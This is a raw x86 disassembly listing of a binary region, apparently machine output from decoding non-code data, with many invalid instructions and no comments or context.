  5237c6:	lss    edi,FWORD PTR [ebx]
  5237c9:	fucom  st(5)
  5237cb:	mov    ds:0xde37e4c0,eax
  5237d0:	dec    edx
  5237d1:	jmp    0x7846:0xcc889e8e
  5237d8:	xor    eax,DWORD PTR [ecx-0x53c2aad9]
  5237de:	loopne 0x523847
  5237e0:	fisub  DWORD PTR [eax+0x5b]
  5237e3:	sub    dh,BYTE PTR gs:[edx-0x2347905d]
  5237ea:	push   0x63
  5237ec:	xor    BYTE PTR [ebp-0x4e259a21],bl
  5237f2:	icebp  
  5237f3:	inc    esi
  5237f4:	dec    ecx
  5237f5:	ss adc eax,0xa0e37877
  5237fb:	(bad)  
  5237fc:	retf   
  5237fd:	push   edi
  5237fe:	mov    ss,WORD PTR [esi]
  523800:	inc    ebx
  523801:	and    eax,0xb11331b
  523806:	in     al,0x84
  523808:	sti    
  523809:	add    al,0xf8
  52380b:	out    0xf0,al
  52380d:	adc    BYTE PTR [ecx],0xd2
  523810:	pusha  
  523811:	mov    ch,0x53
  523813:	cmp    al,BYTE PTR [ecx]
  523815:	add    eax,0x80da0551
  52381a:	dec    edx
  52381b:	outs   dx,DWORD PTR ds:[esi]
  52381c:	dec    esp
  52381d:	shr    eax,1
  52381f:	add    dx,dx
  523822:	mov    cs,WORD PTR [ebp+0x20]
  523825:	mov    eax,0x9b8c3381
  52382a:	aaa    
  52382b:	inc    cx
  52382d:	fidiv  DWORD PTR [edx]
  52382f:	xor    al,0x8e
  523831:	(bad)  
  523833:	cli    
  523834:	jmp    0xbebd:0xbf875446
  52383b:	mov    edx,0x152f00ab
  523840:	int    0x77
  523842:	push   edx
  523843:	dec    edi
  523844:	mov    cl,0xd6
  523846:	out    0xd9,al
  523848:	jns    0x5237dd
  52384a:	xor    eax,0xa7e76745
  52384f:	adc    al,0x94
  523851:	xor    al,0x44
  523853:	aas    
  523854:	ins    DWORD PTR es:[edi],dx
  523855:	xlat   BYTE PTR ds:[ebx]
  523856:	inc    esp
  523857:	mov    ch,0x65
  523859:	dec    ebx
  52385a:	fstp   TBYTE PTR [esi-0x34]
  52385d:	jae    0x523891
  52385f:	sbb    ecx,DWORD PTR [edi-0x2d]
  523862:	mov    dl,bh
  523864:	push   0xdc12eb4b
  523869:	lock jl 0x52380e
  52386c:	(bad)  
  52386e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  52386f:	ret    0x9c6
  523872:	(bad)  
  523874:	fmul   st,st(1)
  523876:	call   0x9efe:0xc1ea7fe0
  52387d:	dec    ecx
  52387e:	push   esi
  52387f:	adc    BYTE PTR [ebx+ecx*4+0x2613680f],0x95
  523887:	jge    0x5238d1
  523889:	and    ch,ah
  52388b:	out    dx,al
  52388c:	lods   al,BYTE PTR ds:[esi]
  52388d:	fisubr WORD PTR [ebx+ebp*8-0x18]
  523891:	jno    0x523857
  523893:	jecxz  0x52383f
  523895:	add    dh,BYTE PTR [ebx]
  523897:	mov    esi,0xb9adae43
  52389c:	fidivr WORD PTR [ecx]
  52389e:	mov    ebp,0xf9f7a8c2
  5238a3:	cld    
  5238a4:	ins    BYTE PTR es:[edi],dx
  5238a5:	aaa    
  5238a6:	stc    
  5238a7:	or     DWORD PTR [ebx+0x66],esi
  5238aa:	cmovb  ebp,DWORD PTR [ebx]
  5238ad:	aaa    
  5238ae:	xchg   ebp,eax
  5238af:	pop    ebx
  5238b0:	pop    ds
  5238b1:	cmp    ah,ch
  5238b3:	es inc esp
  5238b5:	pop    esi
  5238b6:	lea    eax,[ebp+0x6d]
  5238b9:	gs jp  0x523875
  5238bc:	jl     0x5238bc
  5238be:	push   di
  5238c0:	xchg   BYTE PTR [eax+0xb2b787e],dh
  5238c6:	mov    esp,0xb80e2004
  5238cb:	push   es
  5238cc:	and    DWORD PTR [esi+0x24],edx
  5238cf:	iret   
  5238d0:	call   0x4cf9f796
  5238d5:	out    0x1d,al
  5238d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  5238d8:	ins    DWORD PTR es:[edi],dx
  5238d9:	mov    esp,0x5d140bef
  5238de:	jp     0x523882
  5238e0:	ss mov ch,0x3d
  5238e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  5238e4:	rol    edi,cl
  5238e6:	dec    esi
  5238e7:	daa    
  5238e8:	or     DWORD PTR [ecx],0x9cca1d95
  5238ee:	outs   dx,BYTE PTR ds:[esi]
  5238ef:	lods   eax,DWORD PTR ds:[esi]
  5238f0:	or     dl,ch
  5238f2:	inc    edx
  5238f3:	pop    eax
  5238f4:	popa   
  5238f5:	pop    es
  5238f6:	jmp    0xd6b83732
  5238fb:	out    dx,eax
  5238fc:	mov    ebp,0x61bbf847
  523901:	jnp    0x5238c2
  523903:	add    eax,0x269a7ba7
  523908:	or     DWORD PTR [ebp+esi*4-0x3c850e94],edi
  52390f:	mov    edi,0xf7a6f1ce
  523914:	sub    BYTE PTR ds:0x259a9ffb,dl
  52391a:	aas    
  52391b:	arpl   WORD PTR [edi],ax
  52391d:	mov    edi,0xb8e6243e
  523922:	xchg   DWORD PTR [ecx+eax*2],ebp
  523925:	in     eax,dx
  523926:	scas   al,BYTE PTR es:[edi]
  523927:	addr16 fs push esi
  52392a:	(bad)  ds:0x56eb2cbb
  523930:	push   ss
  523931:	jns    0x523996
  523933:	adc    BYTE PTR [edx+0x23],ch
  523936:	jge    0x523935
  523938:	sti    
  523939:	pop    esp
  52393a:	jmp    0x7bd6:0xfdd74787
  523941:	mov    ah,0x4f
  523943:	ins    DWORD PTR es:[edi],dx
  523944:	jmp    0x523983
  523946:	retf   
  523947:	(bad)  
  523948:	pop    ss
  523949:	ret    
  52394a:	scas   al,BYTE PTR es:[edi]
  52394b:	add    dl,BYTE PTR [bx+0x3c]
  52394f:	in     eax,0xef
  523951:	dec    edx
  523952:	jne    0x52395b
  523954:	or     BYTE PTR [ebx-0x559267d3],dh
  52395a:	(bad)  
  52395c:	sahf   
  52395d:	cmp    bh,BYTE PTR [ebx+0x19]
  523960:	das    
  523961:	out    dx,eax
  523962:	pushf  
  523963:	sahf   
  523964:	xchg   esi,eax
  523965:	loopne 0x523954
  523967:	arpl   WORD PTR [edx],sp
  523969:	fadd   DWORD PTR [edx]
  52396b:	pop    edi
  52396c:	out    dx,al
  52396d:	and    ecx,DWORD PTR [ebx+edx*1-0x6]
  523971:	push   esp
  523972:	sbb    al,0xe9
  523974:	ds dec esp
  523976:	loope  0x52397d
  523978:	cmp    dl,BYTE PTR [esi+0x39]
  52397b:	enter  0x96f3,0x1f
  52397f:	imul   esi,DWORD PTR [ecx-0x1],0x79
  523983:	scas   al,BYTE PTR es:[edi]
  523984:	or     eax,0x38513f2b
  523989:	rol    BYTE PTR [eax+0x1f1dc0c6],1
  52398f:	push   edi
  523990:	je     0x52398a
  523992:	addr16 dec ebx
  523994:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  523995:	pop    ss
  523996:	mov    edx,DWORD PTR [eax]
  523998:	repz scas al,BYTE PTR es:[edi]
  52399a:	enter  0x7fc4,0x34
  52399e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  52399f:	adc    eax,0x78958a8d
  5239a4:	cli    
  5239a5:	fsub   QWORD PTR ds:0x220ea171
  5239ab:	push   ds
  5239ac:	mov    bh,0x2
  5239ae:	fldenv ds:0xcf5dc1bd
  5239b4:	fwait
  5239b5:	cli    
  5239b6:	or     DWORD PTR ds:[ecx*2-0x32cd3f5f],edx
  5239be:	loope  0x523a1d
  5239c0:	jb     0x523a2e
  5239c2:	pop    eax
  5239c3:	mov    bl,0x26
  5239c5:	push   cs
  5239c6:	dec    ebx
  5239c7:	je     0x5239af
  5239c9:	in     eax,0x35
  5239cb:	retf   0xcd5
  5239ce:	cld    
  5239cf:	mov    DWORD PTR [ebx],esp
  5239d1:	and    BYTE PTR [ecx],dl
  5239d3:	pop    eax
  5239d4:	das    
  5239d5:	mov    ds:0xbd60cfe0,eax
  5239da:	mov    ebx,0x830b0738
  5239df:	mov    edx,0xf4e0b579
  5239e4:	out    dx,al
  5239e5:	add    DWORD PTR [edx-0x1f8624a1],ecx
  5239eb:	cmc    
  5239ec:	and    BYTE PTR ds:0x675dc78,0x73
  5239f3:	xchg   ebx,eax
  5239f4:	mul    DWORD PTR [ecx]
  5239f6:	inc    edi
  5239f7:	sub    eax,0x7fc1596b
  5239fc:	icebp  
  5239fd:	and    al,0xcc
  5239ff:	in     al,0xdc
  523a01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  523a02:	(bad)  
  523a03:	cmp    BYTE PTR [ecx],ch
  523a05:	daa    
  523a06:	fwait
  523a07:	std    
  523a08:	fst    DWORD PTR [ebx+ebx*4]
  523a0b:	aaa    
  523a0c:	lock test BYTE PTR [esi],0xac
  523a10:	outs   dx,DWORD PTR ds:[esi]
  523a11:	mov    ebx,ss
  523a13:	repnz adc al,ah
  523a16:	jns    0x523a79
  523a18:	aaa    
  523a19:	or     ecx,edx
  523a1b:	jne    0x523a06
  523a1d:	aad    0xa4
  523a1f:	icebp  
  523a20:	adc    DWORD PTR [ecx],edx
  523a22:	add    al,0xb6
  523a24:	in     al,dx
  523a25:	mov    bx,0xbc52
  523a29:	xchg   ebp,eax
  523a2a:	mov    cl,0x47
  523a2c:	cmp    al,0x7e
  523a2e:	or     cl,BYTE PTR [ecx]
  523a30:	leave  
  523a31:	aad    0x25
  523a33:	ja     0x523a64
  523a35:	or     eax,0xd0d17a47
  523a3a:	jp     0x523a5e
  523a3c:	add    bl,cl
  523a3e:	cs dec eax
  523a40:	sbb    al,0xa5
  523a42:	mov    ecx,0xafe6c6a
  523a47:	jmp    0xd824:0x30e602fe
  523a4e:	jbe    0x523ab6
  523a50:	fld    DWORD PTR [ecx+0x19]
  523a53:	or     edx,DWORD PTR [eax]
  523a55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  523a56:	dec    esi
  523a57:	jg     0x523a49
  523a59:	xor    al,0x1a
  523a5b:	dec    ebx
  523a5c:	xor    DWORD PTR es:0x5895969d,ebp
  523a63:	pop    ebp
  523a64:	mov    cl,cl
  523a66:	xchg   DWORD PTR [esi],esi
  523a68:	mov    esp,0x8f951b2e
  523a6d:	popf   
  523a6e:	pop    ds
  523a6f:	xchg   BYTE PTR [ecx+0xfa0823d],bl
  523a75:	pushf  
  523a76:	mov    ds:0x80516d48,al
  523a7b:	pop    ebp
  523a7c:	lea    ecx,[esi+0x5d004d8]
  523a82:	sub    edx,DWORD PTR [ebx]
  523a84:	retf   0xf2c2
  523a87:	xor    edx,DWORD PTR [edx-0x65]
  523a8a:	xchg   esp,eax
  523a8b:	mov    WORD PTR [eax-0x3f],?
  523a8e:	loopne 0x523a59
  523a90:	jb     0x523a34
  523a92:	dec    ebp
  523a93:	(bad)  
  523a94:	mov    DWORD PTR ds:[ebp+0x7],edi
  523a98:	pop    ebx
  523a99:	(bad)  
  523a9a:	hlt    
  523a9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  523a9c:	dec    eax
  523a9d:	inc    edx
  523a9e:	idiv   DWORD PTR [esi]
  523aa0:	pop    eax
  523aa1:	js     0x523ace
  523aa3:	loope  0x523a85
  523aa5:	mov    ds:0x22f51813,eax
  523aaa:	xor    DWORD PTR [esi-0x5f1158b6],0x2f
  523ab1:	and    eax,0x4edfc941
  523ab6:	hlt    
  523ab7:	push   ds
  523ab8:	cmp    eax,0xc9dc611b
  523abd:	call   0x2ed2:0x1a6c0d8d
  523ac4:	sub    eax,0xdde2eba
  523ac9:	lahf   
  523aca:	out    0x40,eax
  523acc:	lea    eax,[ebx]
  523ace:	jmp    0x69b7b25d
  523ad3:	jo     0x523ae4
  523ad5:	sbb    bh,BYTE PTR [edx+0x3f6f3ef3]
  523adb:	cld    
  523adc:	pop    esp
  523add:	dec    ebx
  523ade:	pop    ebx
  523adf:	stos   DWORD PTR es:[edi],eax
  523ae0:	outs   dx,DWORD PTR ds:[esi]
  523ae1:	adc    BYTE PTR [edi+0x62],bl
  523ae4:	xor    cl,BYTE PTR [ecx*8-0x152c09c5]
  523aeb:	sbb    al,0x18
  523aed:	jl     0x523b49
  523aef:	or     eax,0x50d584ff
  523af4:	xor    esi,ecx
  523af6:	push   edx
  523af7:	mov    cl,0x8c
  523af9:	out    dx,eax
  523afa:	pop    DWORD PTR [edi-0x48c375d2]
  523b00:	cmp    eax,0x2fb10ef
  523b05:	mov    bl,0xd6
  523b07:	pop    ds
  523b08:	cs clc 
  523b0a:	and    al,0xeb
  523b0c:	cmp    DWORD PTR [ecx+edi*2+0x287480],edx
  523b13:	jb     0x523af1
  523b15:	xor    BYTE PTR [ebx+0x71af1993],0xa0
  523b1c:	inc    edi
  523b1d:	cmc    
  523b1e:	icebp  
  523b1f:	arpl   bp,si
  523b21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  523b22:	dec    ecx
  523b23:	jmp    0x6ed:0xe9f714fe
  523b2a:	mov    ch,BYTE PTR [edi*4-0x55468394]
  523b31:	add    DWORD PTR [edi-0x51ba004c],ecx
  523b37:	mov    esi,0x31b7ae31
  523b3c:	sub    eax,0x3efa8f48
  523b41:	into   
  523b42:	adc    BYTE PTR [ecx+0x1216a63],bh
  523b48:	fisub  WORD PTR [ecx]
  523b4a:	or     bl,BYTE PTR [ebx-0x44]
  523b4d:	xor    esp,DWORD PTR [ecx+edi*2+0x5e2f816a]
  523b54:	mov    edi,0x5d7f32c4
  523b59:	mov    edx,0xb95308e
  523b5e:	adc    DWORD PTR [esi-0x5168dcc7],0x73
  523b65:	dec    ebx
  523b66:	jle    0x523b7e
  523b68:	sbb    dl,dh
  523b6a:	mov    esi,0xcaaf394a
  523b6f:	and    ebx,DWORD PTR [ebx+edx*8+0x449c17ba]
  523b76:	(bad)  
  523b77:	out    dx,eax
  523b78:	addr16 jle 0x523b59
  523b7b:	add    BYTE PTR [edx+ecx*2],ah
  523b7e:	jmp    0x61bcc140
  523b83:	test   al,ch
  523b85:	sub    ch,dh
  523b87:	out    dx,al
  523b88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  523b89:	or     bl,BYTE PTR [esi+esi*1]
  523b8c:	xchg   BYTE PTR [edx],cl
  523b8e:	stos   BYTE PTR es:[edi],al
  523b8f:	jg     0x523c03
  523b91:	mov    al,ds:0x9b67c96d
  523b96:	push   esp
  523b97:	xor    eax,0x9b4ade64
  523b9c:	jl     0x523c12
  523b9e:	popf   
  523b9f:	push   cs
  523ba0:	test   edi,ebx
  523ba2:	pop    es
  523ba3:	inc    ecx
  523ba4:	in     eax,dx
  523ba5:	call   0xb201:0x94b94daf
  523bac:	enter  0xa10b,0xf5
  523bb0:	mov    eax,0x1ff124c1
  523bb5:	mov    ebp,0x3e0ff674
  523bba:	mov    dh,0x1b
  523bbc:	xchg   edi,eax
  523bbd:	pop    ds
  523bbe:	add    bl,bl
  523bc0:	lds    ebx,FWORD PTR [eax]
  523bc2:	pusha  
  523bc3:	fimul  WORD PTR [ebx]
  523bc5:	jmp    0xe124:0x5961041f
  523bcc:	out    dx,eax
  523bcd:	push   ebp
  523bce:	xor    ebx,esi
  523bd0:	inc    esi
  523bd1:	or     BYTE PTR [ebp-0x46],dh
  523bd4:	inc    eax
  523bd5:	pop    edi
  523bd6:	xchg   edi,eax
  523bd7:	mov    ebp,0xe9fefa72
  523bdc:	dec    edx
  523bdd:	mov    eax,ds:0x49087f29
  523be2:	mov    bl,0x47
  523be4:	xor    DWORD PTR [esi-0x39dadf28],edi
  523bea:	in     eax,0x22
  523bec:	add    DWORD PTR [esi+0x71],eax
  523bef:	push   ebp
  523bf0:	retf   0x84c4
  523bf3:	add    BYTE PTR [esi-0x64b8f4f5],0x5d
  523bfa:	imul   edx,ebx,0xc8e6e5db
  523c00:	pop    esp
  523c01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  523c02:	clc    
  523c03:	push   ds
  523c04:	push   ecx
  523c05:	cmp    BYTE PTR [ebx+0x980a377],0xab
  523c0c:	daa    
  523c0d:	lds    esp,FWORD PTR [edi+edx*2-0x5520a16e]
  523c14:	jg     0x523c08
  523c16:	pusha  
  523c17:	scas   eax,DWORD PTR es:[edi]
  523c18:	aad    0x24
  523c1a:	push   ebp
  523c1b:	ja     0x523c88
  523c1d:	push   ebx
  523c1e:	rol    ah,0x44
  523c21:	xchg   edi,eax
  523c22:	out    dx,eax
  523c23:	shl    BYTE PTR [esp+esi*1+0x3b],cl
  523c27:	loop   0x523c47
  523c29:	fdiv   DWORD PTR [edi+0x49]
  523c2c:	cmp    al,0x25
  523c2e:	add    BYTE PTR [esi+0x773a7db7],dl
  523c34:	and    eax,0xb91790a0
  523c39:	test   bh,ah
  523c3b:	or     ebx,0xffffffed
  523c3e:	ss daa 
  523c40:	lods   eax,DWORD PTR ds:[esi]
  523c41:	clc    
  523c42:	mov    DWORD PTR [ebx+eiz*1-0x65f4d7b3],esi
  523c49:	add    ebx,DWORD PTR [ebx]
  523c4b:	pop    ecx
  523c4c:	lods   al,BYTE PTR ds:[esi]
  523c4d:	shr    bl,cl
  523c4f:	mov    ds:0x1f012b8b,eax
  523c54:	adc    ebp,DWORD PTR [ecx+0x5feace70]
  523c5a:	mov    esi,0x799a7207
  523c5f:	aas    
  523c60:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  523c62:	test   eax,0xdf0ae701
  523c67:	leave  
  523c68:	jb     0x523ccd
  523c6a:	inc    ecx
  523c6b:	bound  ecx,QWORD PTR [edx-0x682d822f]
  523c71:	inc    ebp
  523c72:	emms   
  523c74:	pop    ds
  523c75:	popa   
  523c76:	push   ss
  523c77:	add    DWORD PTR [edi-0x14],0x31
  523c7b:	pop    ecx
  523c7c:	arpl   WORD PTR ss:[edx+0x75],di
  523c80:	add    esp,DWORD PTR [ebp+0x39]
  523c83:	push   sp
  523c85:	leave  
  523c86:	std    
  523c87:	mov    esp,0x15beab56
  523c8c:	movd   mm5,ecx
  523c8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  523c90:	inc    ebp
  523c91:	in     al,0x45
  523c93:	int3   
  523c94:	jnp    0x523cd8
  523c96:	cmp    BYTE PTR [esi-0x23],bh
  523c99:	sbb    al,0xa4
  523c9b:	xchg   ecx,eax
  523c9c:	mov    dl,al
  523c9e:	int3   
  523c9f:	imul   esp,DWORD PTR [edi],0xc25d6a52
  523ca5:	xor    cl,bh
  523ca7:	push   0x3feb462a
  523cac:	mov    DWORD PTR [esi],edx
  523cae:	and    DWORD PTR [ecx+0x3dd0c830],ecx
  523cb4:	jb     0x523ced
  523cb6:	nop
  523cb7:	sub    al,0x23
  523cb9:	mov    bl,0x80
  523cbb:	leave  
  523cbc:	ins    DWORD PTR es:[edi],dx
  523cbd:	add    ebp,0xafcecc8e
  523cc3:	retf   
  523cc4:	std    
  523cc5:	xor    BYTE PTR [eiz*2+0x4248120e],0xc1
  523ccd:	adc    DWORD PTR [ebp-0x8],esp
  523cd0:	into   
  523cd1:	outs   dx,DWORD PTR ds:[esi]
  523cd2:	push   edi
  523cd3:	sub    bh,al
  523cd5:	add    al,0xac
  523cd7:	add    DWORD PTR [ebx],eax
  523cd9:	mov    ebx,0x4676aefa
  523cdf:	mov    esp,0x9f7988ac
  523ce4:	xchg   esp,eax
  523ce5:	push   edx
  523ce6:	mov    bh,0x60
  523ce8:	push   esp
  523ce9:	mov    edx,0x4b0f1f00
  523cee:	and    BYTE PTR [ebp+edx*1+0x1f493793],cl
  523cf5:	cmp    DWORD PTR [edx-0xa],edi
  523cf8:	stos   BYTE PTR es:[edi],al
  523cf9:	push   ds
  523cfa:	clc    
  523cfb:	xchg   ebx,eax
  523cfc:	mov    cl,0x47
  523cfe:	ss pop esp
  523d00:	cmp    al,BYTE PTR [esi-0x25]
  523d03:	pop    es
  523d04:	ficom  WORD PTR [esi+0x75067848]
  523d0a:	cmp    al,0x84
  523d0c:	lock adc dl,BYTE PTR [ebp+0x5892c6f5]
  523d13:	fwait
  523d14:	and    ch,BYTE PTR [ecx-0x1f2b5a9c]
  523d1a:	push   ebx
  523d1b:	xchg   edi,eax
  523d1c:	into   
  523d1d:	daa    
  523d1e:	pop    ebp
  523d1f:	pop    esi
  523d20:	push   edx
  523d21:	cli    
  523d22:	pusha  
  523d23:	or     eax,0xe977cfda
  523d28:	cmp    al,0xfe
  523d2a:	inc    edi
  523d2b:	aaa    
  523d2c:	fwait
  523d2d:	test   eax,0xe3325ed0
  523d32:	push   0xa9c4cb38
  523d37:	lock cpuid 
  523d3a:	mov    dh,0x1f
  523d3c:	cli    
  523d3d:	pop    ss
  523d3e:	out    dx,al
  523d3f:	lds    esi,FWORD PTR [ecx+0x50]
  523d42:	mov    al,0x1e
  523d44:	jns    0x523d8d
  523d46:	addr16 inc esp
  523d48:	add    edi,DWORD PTR [ebx-0x4e]
  523d4b:	fwait
  523d4c:	jno    0x523d1c
  523d4e:	push   esi
  523d4f:	adc    DWORD PTR [eax+0x125fbb5b],esi
  523d55:	mov    eax,0x57395124
  523d5a:	dec    esi
  523d5b:	add    BYTE PTR [ebx+0x31feb2bd],0x1
  523d62:	pushf  
  523d63:	test   BYTE PTR [eax+0x7bd179e2],0x96
  523d6a:	mov    ds:0xfe458cb5,al
  523d6f:	ret    
  523d70:	jne    0x523d66
  523d72:	mov    DWORD PTR [eax+0x30a4e95c],edi
  523d78:	pop    edi
  523d79:	lahf   
  523d7a:	inc    edi
  523d7b:	in     al,0x83
  523d7d:	inc    ebp
  523d7e:	mov    ebx,0xa5cac7c9
  523d83:	daa    
  523d84:	mov    edi,0x50d7c262
  523d89:	and    al,0xa5
  523d8b:	fimul  DWORD PTR [ebp-0x7792a243]
  523d91:	sub    eax,0x3bb822a0
  523d96:	rcl    DWORD PTR ds:0xd206c31,0xa4
  523d9d:	mov    ds:0x71eaefbb,eax
  523da2:	push   ebp
  523da3:	xor    ah,BYTE PTR [ebx+0x1f]
  523da6:	cld    
  523da7:	out    0xb0,eax
  523da9:	mov    gs,ecx
  523dab:	(bad)  
  523dac:	aas    
  523dad:	sub    eax,0x62ad8947
  523db2:	aad    0x87
  523db4:	dec    esi
  523db5:	pop    ecx
  523db6:	sbb    BYTE PTR [edx+0x3e],dl
  523db9:	lds    ebx,FWORD PTR [edx-0x776fce03]
  523dbf:	xor    edi,DWORD PTR [ecx-0x52]
  523dc2:	mov    ds:0xab1b14d5,al
  523dc7:	add    eax,0xa4a7c7fb
  523dcc:	jge    0x523d7d
  523dce:	dec    ah
  523dd0:	add    BYTE PTR [edi+0x6],dh
  523dd3:	mov    dl,BYTE PTR [esi+0x2f]
  523dd6:	xchg   ebx,eax
  523dd7:	ss push cs
  523dd9:	or     BYTE PTR [edx-0x7f],bl
  523ddc:	or     al,0x92
  523dde:	(bad)  
  523ddf:	sub    bl,al
  523de1:	lods   eax,DWORD PTR ds:[esi]
  523de2:	addr16 push ds
  523de4:	stos   DWORD PTR es:[edi],eax
  523de5:	loop   0x523d7a
  523de7:	add    eax,0xefc6201b
  523dec:	les    eax,FWORD PTR [esi]
  523dee:	aaa    
  523def:	jae    0x523d93
  523df1:	sar    DWORD PTR [esi+0x7b],cl
  523df4:	or     edi,DWORD PTR [ebx]
  523df6:	xchg   DWORD PTR [edi-0x45],esi
  523df9:	pop    ss
  523dfa:	mov    ds:0x7d199324,eax
  523dff:	std    
  523e00:	sub    eax,0x698b9707
  523e05:	hlt    
  523e06:	and    ah,BYTE PTR [esi]
  523e08:	add    ah,BYTE PTR [edx+0x67bfe5f6]
  523e0e:	or     ebp,edx
  523e10:	iret   
  523e11:	push   ebx
  523e12:	popf   
  523e13:	inc    eax
  523e14:	add    eax,0x89fbfd15
  523e19:	mov    esi,0x2a931af7
  523e1e:	mov    edi,0x5efaf584
  523e23:	mov    ch,0xbc
  523e25:	sub    BYTE PTR [ebx+ebx*8-0x5e],al
  523e29:	cmp    ecx,DWORD PTR [eax-0x38e27fb9]
  523e2f:	test   dl,0xbb
  523e32:	push   esp
  523e33:	(bad)  
  523e34:	shl    DWORD PTR [ebp+0x5ebceaee],cl
  523e3a:	mov    ds:0x510ab4ba,eax
  523e3f:	dec    edi
  523e40:	cli    
  523e41:	inc    eax
  523e42:	and    bl,bh
  523e44:	adc    eax,0x3dce72e6
  523e49:	out    dx,al
  523e4a:	loop   0x523dea
  523e4c:	jge    0x523e53
  523e4e:	dec    ebp
  523e4f:	in     al,dx
  523e50:	mov    DWORD PTR [eax],esi
  523e52:	or     eax,0xfee1a565
  523e57:	push   0x473f598f
  523e5c:	push   ebp
  523e5d:	into   
  523e5e:	ret    
  523e5f:	xchg   edi,eax
  523e60:	daa    
  523e61:	loope  0x523e58
  523e63:	push   0x652908cb
  523e68:	jae    0x523ec6
  523e6a:	retf   
  523e6b:	mov    dl,0x63
  523e6d:	lods   eax,DWORD PTR ds:[esi]
  523e6e:	pop    esi
  523e6f:	retf   
  523e70:	inc    ebx
  523e71:	lds    edx,FWORD PTR [ecx-0x59]
  523e74:	mov    bh,0x62
  523e76:	or     eax,0xe2115068
  523e7b:	loope  0x523e8a
  523e7d:	popf   
  523e7e:	js     0x523edc
  523e80:	xchg   edx,edx
  523e82:	in     al,dx
  523e83:	inc    esi
  523e84:	pop    ebx
  523e85:	loop   0x523e2f
  523e87:	sub    BYTE PTR [esi],ah
  523e89:	nop
  523e8a:	clc    
  523e8b:	in     eax,dx
  523e8c:	xlat   BYTE PTR ds:[ebx]
  523e8d:	inc    ebx
  523e8e:	icebp  
  523e8f:	xchg   edx,eax
  523e90:	push   esi
  523e91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  523e92:	xchg   DWORD PTR [ecx-0x5da8ccfe],esp
  523e98:	loopne 0x523e44
  523e9a:	xchg   esp,eax
  523e9b:	mov    ch,0xf4
  523e9d:	or     ebx,0x7f0ddbda
  523ea3:	call   0xb5fc:0x8761fb00
  523eaa:	mov    DWORD PTR [ecx-0x1c],edx
  523ead:	mov    cl,0x4e
  523eaf:	test   DWORD PTR [edx+ebx*1+0x1ae94877],ecx
  523eb6:	jne    0x523e92
  523eb8:	cmp    BYTE PTR [edx+edx*2+0x6],dh
  523ebc:	mov    esp,0xdf942dd8
  523ec1:	mov    cl,ah
  523ec3:	iret   
  523ec4:	stos   DWORD PTR es:[edi],eax
  523ec5:	aam    0x75
  523ec7:	inc    eax
  523ec8:	inc    eax
  523ec9:	sbb    dh,bl
  523ecb:	not    BYTE PTR [edx+edi*1]
  523ece:	sbb    eax,0x18ad1b76
  523ed3:	push   ecx
  523ed4:	fistp  DWORD PTR [edi+0x4c]
  523ed7:	dec    ebp
  523ed8:	shl    DWORD PTR [edi],1
  523eda:	mov    dl,0x75
  523edc:	mov    ebp,0x8563e3cc
  523ee1:	cmp    esi,edi
  523ee3:	repz jae 0x523e99
  523ee6:	jnp    0x523f2a
  523ee8:	jecxz  0x523efb
  523eea:	fwait
  523eeb:	ss and al,0xc2
  523eee:	shl    BYTE PTR [ecx-0x1a4475cf],0x26
  523ef5:	jns    0x523e89
  523ef7:	jno    0x523f61
  523ef9:	(bad)
  523efc:	cmp    BYTE PTR [ebp+0x42615bac],dl
  523f02:	in     al,0xf7
  523f04:	(bad)  
  523f05:	and    dl,BYTE PTR [ecx-0x505d81ae]
  523f0b:	add    BYTE PTR [ebp+esi*4-0x1],cl
  523f0f:	mov    al,ds:0x21eaabeb
  523f14:	or     ch,BYTE PTR [ecx]
  523f16:	(bad)  
  523f17:	stc    
  523f18:	and    al,0x5c
  523f1a:	sbb    ebx,DWORD PTR [esi+0x6e]
  523f1d:	push   ecx
  523f1e:	sub    BYTE PTR [esi+0x6c],dh
  523f21:	mov    ebx,0xb0bee4ce
  523f26:	repz enter 0x6aa9,0x6f
  523f2b:	add    eax,0x5dfdd1aa
  523f30:	rcr    DWORD PTR [edx-0x2c],1
  523f33:	test   al,0x6d
  523f35:	mov    ds:0xedc43f62,al
  523f3a:	mov    cl,0xfa
  523f3c:	inc    eax
  523f3d:	mov    ebx,0xe7c9cfe2
  523f42:	test   BYTE PTR [edx-0x70452379],al
  523f48:	xor    ch,cl
  523f4a:	jge    0x523f22
  523f4c:	jnp    0x523f82
  523f4e:	or     dl,BYTE PTR [edi]
  523f50:	xor    DWORD PTR ds:[ebx+0x6a],esp
  523f54:	gs (bad) 
  523f56:	bound  edx,QWORD PTR [esi+0x6478e464]
  523f5c:	adc    edx,edx
  523f5e:	mov    eax,ds:0x8c196528
  523f63:	pop    ds
  523f64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  523f65:	(bad)  
  523f66:	cli    
  523f67:	sti    
  523f68:	inc    eax
  523f69:	pop    ecx
  523f6a:	xchg   edi,eax
  523f6b:	jae    0x523fac
  523f6d:	sub    ecx,DWORD PTR [esi-0xc]
  523f70:	mov    dl,ch
  523f72:	cmc    
  523f73:	std    
  523f74:	ds sbb al,0x14
  523f77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  523f78:	setnp  BYTE PTR [ebx+0x4b4d0719]
  523f7f:	(bad)  
  523f80:	lods   eax,DWORD PTR ds:[esi]
  523f81:	ins    DWORD PTR es:[edi],dx
  523f82:	iret   
  523f83:	mov    al,0xd6
  523f85:	outs   dx,BYTE PTR ds:[esi]
  523f86:	rol    BYTE PTR ds:0xff8963d7,cl
  523f8c:	retf   
  523f8d:	lods   eax,DWORD PTR ds:[esi]
  523f8e:	adc    al,0x22
  523f90:	or     ch,BYTE PTR gs:[esi-0x3a3f9b73]
  523f97:	(bad)  
  523f98:	das    
  523f99:	pop    edx
  523f9a:	adc    esi,DWORD PTR [ebx]
  523f9c:	push   esi
